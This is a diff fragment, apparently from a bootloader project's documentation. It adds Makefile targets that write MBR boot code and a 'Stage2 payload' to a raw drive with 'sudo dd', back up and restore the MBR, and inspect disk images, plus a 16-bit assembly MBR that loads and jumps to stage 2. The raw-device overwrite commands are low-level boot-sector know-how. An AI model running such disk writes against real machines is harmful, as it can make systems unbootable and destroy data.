+	@echo "[+] Existing NTFS partitions and Windows data remain untouched."
+	@echo ""
+
+	@read -p "[?] Confirm deployment to $(DRIVE)? (yes/no): " ans; [ "$$ans" = "yes" ] || (echo "[-] Deployment aborted." && exit 1)
+
+	@echo ""
+	@echo "[*] [1/2] Writing MBR boot code..."
+	sudo dd if=$(MBR_BIN) of=$(DRIVE) bs=446 count=1 conv=notrunc
+	sudo sync
+
+	@echo "[*] [2/2] Writing Stage2 payload..."
+	sudo dd if=$(STAGE2) of=$(DRIVE) seek=1 bs=512 conv=notrunc
+	sudo sync
+
+	@echo ""
+	@echo "[+] Deployment completed successfully."
+
+	@echo "[*] Verifying MBR signature (expected: 55 aa)..."
+	@sudo xxd -s 510 -l 2 $(DRIVE)
+
+	@echo "[*] Verifying partition table integrity..."
+	@sudo parted $(DRIVE) print
+
+# =============================================================================
+# MBR Backup / Restore
+# =============================================================================
+backup-mbr:
+ifndef DRIVE
+	@echo "[-] Usage: make backup-mbr DRIVE=/dev/sdb"
+	@exit 1
+endif
+	@echo "[*] Backing up MBR from $(DRIVE)..."
+	sudo dd if=$(DRIVE) of=$(BUILD)/original_mbr.bin bs=512 count=1
+	@echo "[+] Backup saved to: $(BUILD)/original_mbr.bin"
+
+restore-mbr:
+ifndef DRIVE
+	@echo "[-] Usage: make restore-mbr DRIVE=/dev/sdb"
+	@exit 1
+endif
+	@[ -f $(BUILD)/original_mbr.bin ] || (echo "[-] Backup file not found! Run backup-mbr first." && exit 1)
+
+	@echo "[*] Restoring MBR to $(DRIVE)..."
+	sudo dd if=$(BUILD)/original_mbr.bin of=$(DRIVE) bs=512 count=1 conv=notrunc
+	sudo sync
+	@echo "[+] MBR restoration completed."
+
+# =============================================================================
+# Disk Image Diagnostics
+# =============================================================================
+img-info: $(DISK_IMG)
+	@echo "[*] Inspecting disk image metadata..."
+	@echo "================================================="
+	@parted -s $(DISK_IMG) print
+
+	@echo ""
+	@echo "[*] MBR signature (offset 510):"
+	@xxd -s 510 -l 2 $(DISK_IMG)
+
+	@echo ""
+	@echo "[*] Stage2 header (sector 1, first 16 bytes):"
+	@xxd -s 512 -l 16 $(DISK_IMG)
+
+clean:
+	@echo "[*] Cleaning build artifacts..."
+	rm -rf $(BUILD)
+	@echo "[+] Workspace cleaned."
+```
+
+`mbr/mbr.asm`:
+
+```asm
+; mbr.asm
+; Author: https://github.com/iss4cf0ng
+; MBR (Master Boot Record) code to load the second stage bootloader.
+; Functionality: Load stage 2 bootloader and jump to it.
+
+[BITS 16]
+[ORG 0x7C00]
+
+STAGE2_LOAD_SEG  equ 0x0000
+STAGE2_LOAD_OFF  equ 0x8000
+
+; 52 sectors = a bit more than 25 KB
+STAGE2_SECTORS   equ 52
+
+STAGE2_START_LBA equ 1
+
+STACK_TOP        equ 0x7000
+
+start:
+    cli
+
+    xor ax, ax
+    mov ds, ax
+    mov es, ax
+    mov ss, ax
+
+    mov sp, STACK_TOP
+
+    jmp 0x0000:main
+
+main:
+    mov [boot_drive], dl
+
+    mov si, msg_mbr
+    call print_string
+
+    ; Check INT13 Extensions
+    mov ah, 0x41
+    mov bx, 0x55AA
+    mov dl, [boot_drive]
+
+    int 0x13
+    jc no_ext
+
+    cmp bx, 0xAA55
+    jne no_ext
+
+    mov si, msg_loading
+    call print_string
+
+    ; DAP structure
+    mov si, dap
+
+    mov ah, 0x42
+    mov dl, [boot_drive]
+
+    int 0x13
+    jc disk_error
+
+    mov si, msg_ok
+    call print_string
+
+    mov dl, [boot_drive]
+
+    jmp STAGE2_LOAD_SEG:STAGE2_LOAD_OFF
+
+no_ext:
+    mov si, msg_no_ext
+    call print_string
+    jmp hang
+
+disk_error:
+    mov si, msg_disk_err
+    call print_string
+    jmp hang
+
+hang:
+    cli
+
+.hlt_loop:
+    hlt
+    jmp .hlt_loop
+
+print_string:
+    pusha
+
+.loop:
+    lodsb
+    test al, al
+    jz .done
+
+    mov ah, 0x0E
+    mov bh, 0
+    mov bl, 0x07
+
+    int 0x10
+
+    jmp .loop
+
+.done:
+    popa
+    ret
+
+; Disk Address Packet
+dap:
+    db 0x10
+    db 0x00
+    dw STAGE2_SECTORS
+    dw STAGE2_LOAD_OFF
+    dw STAGE2_LOAD_SEG
+    dd STAGE2_START_LBA
+    dd 0
+
+boot_drive db 0
+
+msg_mbr      db "MBR: Booting...",13,10,0
+msg_loading  db "MBR: Loading Stage2...",13,10,0
+msg_ok       db "MBR: Jumping to Stage2...",13,10,0
+msg_disk_err db "MBR: Disk read error!",13,10,0
+msg_no_ext   db "MBR: INT13 extensions missing!",13,10,0
+
+times 510-($-$$) db 0
+dw 0xAA55
+```
